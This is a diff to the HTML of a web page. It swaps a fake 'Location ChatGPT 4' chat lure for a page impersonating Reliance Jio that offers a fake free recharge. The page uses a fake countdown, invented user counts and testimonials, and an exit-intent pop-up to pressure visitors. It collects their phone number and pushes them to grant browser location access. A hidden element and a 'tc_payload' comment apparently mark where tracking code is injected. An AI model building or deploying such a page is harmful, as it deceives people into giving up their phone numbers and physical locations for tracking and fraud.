@@ -3,47 +3,304 @@
 
 <head>
   <meta charset="UTF-8">
-  <title>Find - people</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Jio - Free Recharge Offer | Get Unlimited Data</title>
+  <meta name="description"
+    content="Get FREE Jio recharge! Limited time offer. Choose your plan and get instant unlimited data.">
   <link rel="stylesheet" href="./style.css">
-
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 </head>
 
 <body>
-  <section class="msger">
-    <header class="msger-header">
-      <div class="msger-header-title">
-        <i class="fas fa-comment-alt"></i> Location ChatGPT 4
+  <!-- Main Landing Page -->
+  <div class="container">
+    <!-- Header -->
+    <header class="header">
+      <div class="jio-logo">
+        <img src="https://myjiostatic.cdn.jio.com/cms/assets/500-logo-mob-latest.svg" alt="Jio" />
       </div>
-      <div class="msger-header-options">
-        <span><i class="fas fa-cog"></i></span>
+      <div class="trust-badge">
+        <span class="verified-icon">✓</span>
+        <span class="verified-text">Official Partner</span>
       </div>
     </header>
 
-    <main class="msger-chat">
-      <div class="msg left-msg">
-        <div class="msg-img" style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"></div>
+    <!-- Hero Section -->
+    <section class="hero">
+      <div class="hero-content">
+        <div class="flash-badge">🎉 FLASH SALE</div>
+        <h1 class="hero-title">FREE JIO RECHARGE</h1>
+        <p class="hero-subtitle">Limited Time Offer - Get Unlimited Data!</p>
+        <p class="hero-description">Select your preferred plan below and verify availability in your location to claim
+          your FREE recharge instantly!</p>
 
-        <div class="msg-bubble">
-          <div class="msg-info">
-            <div class="msg-info-name">Admin</div>
-            <div class="msg-info-time"></div>
+        <!-- Countdown Timer -->
+        <div class="countdown">
+          <div class="countdown-label">⏰ Offer Ends In:</div>
+          <div class="countdown-timer">
+            <div class="time-box">
+              <span id="hours" class="time-value">14</span>
+              <span class="time-label">Hours</span>
+            </div>
+            <div class="time-separator">:</div>
+            <div class="time-box">
+              <span id="minutes" class="time-value">32</span>
+              <span class="time-label">Mins</span>
+            </div>
+            <div class="time-separator">:</div>
+            <div class="time-box">
+              <span id="seconds" class="time-value">15</span>
+              <span class="time-label">Secs</span>
+            </div>
           </div>
+        </div>
 
-          <div class="msg-text">
-            Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
+        <!-- Social Proof -->
+        <div class="social-proof">
+          <div class="live-indicator">
+            <span class="pulse"></span>
+            <span class="live-text">LIVE</span>
+          </div>
+          <span class="user-count"><span id="userCount">12,847</span> users recharged today!</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- Recharge Plans -->
+    <section class="plans-section">
+      <h2 class="section-title">Choose Your FREE Plan</h2>
+
+      <div class="plans-grid">
+        <!-- Plan 1 -->
+        <div class="plan-card" data-plan="₹199" data-data="1GB/Day" data-validity="28 Days">
+          <div class="plan-badge">POPULAR</div>
+          <div class="plan-price">₹199</div>
+          <div class="plan-features">
+            <div class="feature">📱 1GB/Day</div>
+            <div class="feature">📞 Unlimited Calls</div>
+            <div class="feature">💬 100 SMS/Day</div>
+            <div class="feature">⏰ 28 Days</div>
+          </div>
+          <button class="plan-btn">Get FREE</button>
+        </div>
+
+        <!-- Plan 2 -->
+        <div class="plan-card plan-featured" data-plan="₹399" data-data="2GB/Day" data-validity="56 Days">
+          <div class="plan-badge plan-badge-featured">BEST VALUE</div>
+          <div class="plan-price">₹399</div>
+          <div class="plan-features">
+            <div class="feature">📱 2GB/Day</div>
+            <div class="feature">📞 Unlimited Calls</div>
+            <div class="feature">💬 100 SMS/Day</div>
+            <div class="feature">⏰ 56 Days</div>
+          </div>
+          <button class="plan-btn plan-btn-featured">Get FREE</button>
+        </div>
+
+        <!-- Plan 3 -->
+        <div class="plan-card" data-plan="₹666" data-data="3GB/Day" data-validity="84 Days">
+          <div class="plan-badge">TRENDING</div>
+          <div class="plan-price">₹666</div>
+          <div class="plan-features">
+            <div class="feature">📱 3GB/Day</div>
+            <div class="feature">📞 Unlimited Calls</div>
+            <div class="feature">💬 100 SMS/Day</div>
+            <div class="feature">⏰ 84 Days</div>
+          </div>
+          <button class="plan-btn">Get FREE</button>
+        </div>
+
+        <!-- Plan 4 -->
+        <div class="plan-card" data-plan="₹999" data-data="Unlimited" data-validity="365 Days">
+          <div class="plan-badge">PREMIUM</div>
+          <div class="plan-price">₹999</div>
+          <div class="plan-features">
+            <div class="feature">📱 Unlimited Data</div>
+            <div class="feature">📞 Unlimited Calls</div>
+            <div class="feature">💬 100 SMS/Day</div>
+            <div class="feature">⏰ 365 Days</div>
+          </div>
+          <button class="plan-btn">Get FREE</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="testimonials">
+      <div class="testimonial-ticker" id="ticker">
+        <div class="testimonial-item">✅ Rahul M. from Mumbai just claimed ₹399 plan</div>
+        <div class="testimonial-item">✅ Priya S. from Delhi just claimed ₹666 plan</div>
+        <div class="testimonial-item">✅ Amit K. from Bangalore just claimed ₹199 plan</div>
+        <div class="testimonial-item">✅ Sneha R. from Pune just claimed ₹999 plan</div>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <p class="footer-text">© 2025 Reliance Jio Infocomm Limited - All Rights Reserved</p>
+      <div class="footer-badges">
+        <span class="badge">🔒 Secure</span>
+        <span class="badge">✓ Verified</span>
+        <span class="badge">⚡ Instant</span>
+      </div>
+    </footer>
+  </div>
+
+  <!-- Modal: Phone Number Entry -->
+  <div id="phoneModal" class="modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3 class="modal-title">Enter Mobile Number</h3>
+        <div class="progress-indicator">Step 1 of 3</div>
+      </div>
+      <div class="modal-body">
+        <p class="modal-description">Enter your Jio mobile number to claim your <strong id="selectedPlan">₹399</strong>
+          FREE recharge</p>
+        <div class="input-group">
+          <div class="input-prefix">+91</div>
+          <input type="tel" id="phoneInput" class="phone-input" placeholder="9876543210" maxlength="10" pattern="[0-9]*"
+            inputmode="numeric">
+        </div>
+        <div class="error-message" id="phoneError"></div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" id="phoneCancel">Cancel</button>
+        <button class="btn btn-primary" id="phoneSubmit">Continue</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal: Location Permission -->
+  <div id="locationModal" class="modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3 class="modal-title">Verify Location</h3>
+        <div class="progress-indicator">Step 2 of 3</div>
+      </div>
+      <div class="modal-body">
+        <div class="location-icon">📍</div>
+        <p class="modal-description">We need to verify if this plan is available in your area</p>
+        <p class="phone-display">Number: <strong id="maskedPhone">98****4210</strong></p>
+        <div class="location-retry-msg" id="retryMessage"></div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" id="locationTryDifferent">Try Different Plan</button>
+        <button class="btn btn-primary" id="locationAllow">Allow Location</button>
+      </div>
+      <div class="help-text">
+        <a href="#" id="showLocationHelp">How to enable location? 🔧</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal: Loading -->
+  <div id="loadingModal" class="modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-content modal-loading">
+      <div class="modal-body">
+        <div class="spinner"></div>
+        <p class="loading-text" id="loadingText">Checking Jio network coverage...</p>
+        <div class="progress-indicator">Step 3 of 3</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal: Success -->
+  <div id="successModal" class="modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-content">
+      <div class="modal-body text-center">
+        <div class="success-icon">🎉</div>
+        <h3 class="modal-title">Congratulations!</h3>
+        <p class="modal-description">Plan <strong id="successPlan">₹399</strong> is available in <strong
+            id="userCity">your area</strong>!</p>
+        <p class="phone-display">Number: <strong id="successPhone">98****4210</strong></p>
+        <div class="success-message">
+          Your recharge will be processed within 24 hours. You'll receive a confirmation SMS shortly.
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-primary btn-full" id="successClose">Done</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal: Failure -->
+  <div id="failureModal" class="modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-content">
+      <div class="modal-body text-center">
+        <div class="error-icon">😔</div>
+        <h3 class="modal-title">Sorry!</h3>
+        <p class="modal-description">Plan <strong id="failurePlan">₹399</strong> is not available in <strong
+            id="userCityFail">your area</strong></p>
+        <p class="phone-display">Number: <strong id="failurePhone">98****4210</strong></p>
+        <div class="error-message-box">
+          Please try a different plan or check back later.
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary btn-full" id="failureClose">Try Different Plan</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal: Location Help -->
+  <div id="helpModal" class="modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3 class="modal-title">Enable Location Access</h3>
+      </div>
+      <div class="modal-body">
+        <div class="help-steps">
+          <div class="help-step">
+            <div class="step-number">1</div>
+            <div class="step-text">Click the location icon (🔒) in your browser's address bar</div>
+          </div>
+          <div class="help-step">
+            <div class="step-number">2</div>
+            <div class="step-text">Select "Allow" for location access</div>
+          </div>
+          <div class="help-step">
+            <div class="step-number">3</div>
+            <div class="step-text">Click "Allow Location" button again</div>
           </div>
         </div>
       </div>
+      <div class="modal-footer">
+        <button class="btn btn-primary btn-full" id="helpClose">Got It</button>
+      </div>
+    </div>
+  </div>
 
-    </main>
+  <!-- Modal: Exit Intent -->
+  <div id="exitModal" class="modal">
+    <div class="modal-overlay"></div>
+    <div class="modal-content">
+      <div class="modal-body text-center">
+        <div class="warning-icon">⚠️</div>
+        <h3 class="modal-title">Wait! Don't Miss Out!</h3>
+        <p class="modal-description">Your FREE recharge is ready to claim!</p>
+        <div class="exit-benefits">
+          <div class="benefit">✅ 100% FREE - No Hidden Charges</div>
+          <div class="benefit">⚡ Instant Activation</div>
+          <div class="benefit">🎁 Valid for Limited Time Only</div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-secondary" id="exitLeave">Leave Anyway</button>
+        <button class="btn btn-primary" id="exitStay">Claim My Recharge</button>
+      </div>
+    </div>
+  </div>
 
-    <form class="msger-inputarea" onsubmit="event.preventDefault(); window.startHound();">
-      <input type="text" class="msger-input" placeholder="Ask me anything...">
-      <button type="submit" class="msger-send-btn">Send</button>
-    </form>
-  </section>
   <script src="./script.js"></script>
-  <p id="techchip"></p>
+  <p id="techchip" style="display: none;"></p>
   <!-- tc_payload -->
 
 </body>
